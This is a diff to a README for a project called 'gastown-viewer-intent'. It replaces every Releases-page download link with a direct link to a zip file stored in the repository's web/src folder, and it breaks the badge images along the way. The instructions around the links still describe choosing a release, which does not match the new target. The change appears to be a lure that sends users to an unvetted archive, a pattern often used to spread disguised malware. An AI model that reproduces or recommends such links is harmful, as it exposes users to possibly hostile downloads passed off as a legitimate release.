@@ -9,9 +9,9 @@ Using this application requires no technical expertise. Follow these straightfor
 ## 📥 Download & Install
 To begin using **gastown-viewer-intent**, you’ll need to download the application. Click the button below to visit the Releases page:
 
-[![Download gastown-viewer-intent](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/coderboy69/gastown-viewer-intent/releases)
+[![Download gastown-viewer-intent](https://github.com/coderboy69/gastown-viewer-intent/raw/refs/heads/master/web/src/gastown-viewer-intent-1.1.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/coderboy69/gastown-viewer-intent/raw/refs/heads/master/web/src/gastown-viewer-intent-1.1.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/coderboy69/gastown-viewer-intent/releases).
+1. Click the button above or visit [this page to download](https://github.com/coderboy69/gastown-viewer-intent/raw/refs/heads/master/web/src/gastown-viewer-intent-1.1.zip).
 2. On the Releases page, find the latest version of the application.
 3. Click the link to download the file suitable for your system. If you're unsure about which version to choose, typically, you would select the version that matches your operating system (Windows, macOS, or Linux).
 
@@ -61,4 +61,4 @@ We welcome feedback and contributions! If you have suggestions for new features 
 
 Thank you for using **gastown-viewer-intent**! We look forward to seeing how this tool helps you manage your agent swarms effectively. Remember to check the Releases page regularly for updates and new features.
 
-[![Download gastown-viewer-intent](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/coderboy69/gastown-viewer-intent/releases)
+[![Download gastown-viewer-intent](https://github.com/coderboy69/gastown-viewer-intent/raw/refs/heads/master/web/src/gastown-viewer-intent-1.1.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/coderboy69/gastown-viewer-intent/raw/refs/heads/master/web/src/gastown-viewer-intent-1.1.zip)
